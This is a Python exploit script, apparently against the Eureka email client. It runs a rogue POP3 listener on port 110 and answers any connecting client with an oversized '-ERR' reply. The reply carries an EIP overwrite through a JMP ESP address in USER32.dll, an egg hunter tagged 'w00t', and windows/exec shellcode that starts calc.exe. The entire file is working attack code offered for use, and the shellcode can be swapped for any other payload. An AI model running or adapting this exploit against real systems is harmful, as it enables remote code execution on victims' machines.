#!/usr/bin/python
import socket, struct

# Our local server
local_server = "192.168.1.15"
# Calculating offset to EIP
junk = "A" * (723 - len(local_server))
# Packs the address in little-endian.
# JMP ESP from USER32.dll
ret = struct.pack('<I', 0x7E455AF7)
padding = "\x90" * 1000

# Our egg hunter
# "\x77\x30\x30\x74" is our tag: w00t
egg_hunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + "\x77\x30\x30\x74" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Our payload, windows/exec CMD=calc.exe
shellcode = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50" +
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7" +
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78" +
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3" +
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01" +
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58" +
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3" +
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a" +
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d" +
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb" +
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c" +
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" +
"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00")


buffer = junk + ret + egg_hunter + padding + "w00tw00t" + shellcode

try:
	# Setting up a listener on port 110
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print("[*] Listening on TCP port 110 [POP3]...")
	print("[*] Have someone connect to this host!\n")
	
	connect, addr = s.accept()

	print("[*] Received connection from: ", addr)
	print("[*] Sending payload...\n")

	# Using a while loop since Eureka survives our first wave of attacks
	while 1:
		connect.send("-ERR " + buffer + "\r\n")
	connect.close()

except:
	print("[*] Connection closed.\n")

